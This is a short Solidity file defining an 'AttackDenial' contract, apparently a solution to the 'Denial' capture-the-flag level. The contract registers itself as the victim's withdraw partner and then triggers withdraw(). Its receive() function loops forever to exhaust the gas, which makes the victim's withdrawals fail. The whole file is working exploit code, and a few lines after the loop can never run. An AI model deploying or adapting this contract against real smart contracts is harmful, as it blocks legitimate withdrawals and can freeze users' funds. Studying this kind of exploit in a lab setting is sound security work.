pragma solidity ^0.8.10;

interface IDenial {    
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;    
    function contractBalance() external view returns (uint) ;
}

contract AttackDenial {
    address public victim;
    IDenial public d;        
    event CheckGas(uint _value);

    constructor(address _victim) { 
        victim = _victim;                   
    }
    receive() external payable {
        while(true){}
        uint x = gasleft();
        emit CheckGas(x);
    }
    
    function attack () public {
        d = IDenial(victim);
        d.setWithdrawPartner(address(this));    
        d.withdraw();    
    }
}